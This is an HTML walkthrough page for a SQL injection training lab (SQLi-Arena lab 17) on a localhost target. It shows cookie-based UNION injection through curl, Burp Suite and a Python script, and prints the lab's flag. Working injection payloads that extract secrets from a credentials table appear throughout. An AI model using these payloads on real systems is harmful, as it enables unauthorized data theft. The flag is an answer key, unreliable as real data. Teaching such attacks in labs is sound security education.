<h4>Step 1: Set a Normal Cookie Value</h4>
<p>
    Set the <code>user_id</code> cookie to a known value like <code>user1</code>.
    The page should display that user's preferences (theme, language, last login).
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Cookie</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id=user1" "http://localhost/SQLi-Arena/mysql/lab17"<br><br>
        <span class="prompt">Cookie: </span>user_id=user1<br><br>
        <span class="prompt">Query: </span>SELECT theme, language, last_login FROM preferences WHERE user_id = 'user1'<br><br>
        <span class="prompt">Result: </span>Theme: dark | Language: en | Last Login: 2026-03-20 08:30:00
    </div>
</div>

<h4>Step 2: Trigger an Error with a Single Quote</h4>
<p>
    Set the cookie to a single quote <code>'</code> to break the query and confirm
    the injection point.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Trigger SQL Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id='" "http://localhost/SQLi-Arena/mysql/lab17"<br><br>
        <span class="prompt">Cookie: </span>user_id='<br><br>
        <span class="prompt">Query: </span>SELECT theme, language, last_login FROM preferences WHERE user_id = '''<br><br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1<br><br>
        <span class="prompt">Analysis: </span>The error confirms the cookie value is injected into a string-based WHERE clause.
    </div>
</div>

<h4>Step 3: Determine Column Count with ORDER BY</h4>
<p>
    Use <code>ORDER BY</code> to determine how many columns the original query returns.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id=' ORDER BY 1 -- -" "http://localhost/SQLi-Arena/mysql/lab17"<br>
        <span class="prompt">Cookie: </span>user_id=' ORDER BY 1 -- -&nbsp;&nbsp; &rarr; No error<br>
        <span class="prompt">Cookie: </span>user_id=' ORDER BY 2 -- -&nbsp;&nbsp; &rarr; No error<br>
        <span class="prompt">Cookie: </span>user_id=' ORDER BY 3 -- -&nbsp;&nbsp; &rarr; No error<br>
        <span class="prompt">Cookie: </span>user_id=' ORDER BY 4 -- -&nbsp;&nbsp; &rarr; Unknown column '4' in 'ORDER BY'<br><br>
        <span class="prompt">Result: </span>The query returns <strong>3 columns</strong> (theme, language, last_login).
    </div>
</div>

<h4>Step 4: UNION SELECT to Extract the Flag</h4>
<p>
    Use <code>UNION SELECT</code> with 3 columns to pull data from the <code>credentials</code> table.
    The flag will appear in the theme and language columns.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Extraction (In-Browser)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Cookie: </span>user_id=' UNION SELECT secret, service, NOW() FROM credentials WHERE service='database' -- -<br><br>
        <span class="prompt">Query: </span>SELECT theme, language, last_login FROM preferences WHERE user_id = '' UNION SELECT secret,service,NOW() FROM credentials WHERE service='database' -- -'<br><br>
        <span class="prompt">Result: </span><br>
        &nbsp;&nbsp;Theme: <strong>FLAG{c00k13_h34d3r_1nj3ct10n}</strong><br>
        &nbsp;&nbsp;Language: database<br>
        &nbsp;&nbsp;Last Login: 2026-03-24 03:38:18
    </div>
</div>

<h4>Step 5: Alternative. Using curl</h4>
<p>
    In a real-world scenario, you would use <code>curl</code> or <strong>Burp Suite</strong>
    to set arbitrary cookie values. The in-browser form is provided for convenience,
    but real cookie injection typically requires these tools.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5: curl Method</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id=' UNION SELECT secret,service,NOW() FROM credentials WHERE service='database' -- -" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab17"<br><br>
        <span class="prompt">Result: </span>Theme: <strong>FLAG{c00k13_h34d3r_1nj3ct10n}</strong> | Language: database | Last Login: 2026-03-24 03:38:18
    </div>
</div>

<h4>Step 6: Alternative. Using Burp Suite</h4>
<p>
    Intercept the request in Burp Suite and modify the <code>Cookie</code> header directly.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Burp Suite Method</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>Open Burp Suite and configure your browser proxy.<br>
        <span class="prompt">2. </span>Visit the lab page with the user_id cookie set to any value.<br>
        <span class="prompt">3. </span>In Burp, find the request and send it to <strong>Repeater</strong>.<br>
        <span class="prompt">4. </span>Modify the <strong>Cookie:</strong> header:<br>
        &nbsp;&nbsp;<code>Cookie: user_id=' UNION SELECT secret,service,NOW() FROM credentials WHERE service='database' -- -</code><br>
        <span class="prompt">5. </span>Send the request -- the flag appears in the response.
    </div>
</div>

<h4>Step 7: Python Automation Script</h4>
<p>
    Automate the cookie-based UNION injection with this Python script:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Python Automation (lab17_header_cookie.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab17_header_cookie.py http://localhost/SQLi-Arena/<br><br>
        <span class="prompt">[*] </span>Injection point: Cookie header (user_id)<br>
        <span class="prompt">[*] </span>Step 1: Confirming cookie injection point...<br>
        <span class="prompt">[+] </span>ORDER BY 4 failed &rarr; query has 3 columns<br>
        <span class="prompt">[*] </span>Step 2: UNION SELECT with 3 columns...<br><br>
        <span class="prompt">[+] </span>Flag: FLAG{c00k13_h34d3r_1nj3ct10n}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab17_header_cookie.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab17_header_cookie.py')); ?></pre></div>
</div>

<h4>Step 8: Submit the Credential Secret</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{c00k13_h34d3r_1nj3ct10n}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Cookies are just another HTTP header that the client fully controls.
    Never trust cookie values in SQL queries: always use <strong>prepared statements</strong>.
    Even if cookies are originally set by the server, they can be modified by the client at any time
    using browser developer tools, browser extensions, curl, or proxy tools like Burp Suite.
</div>
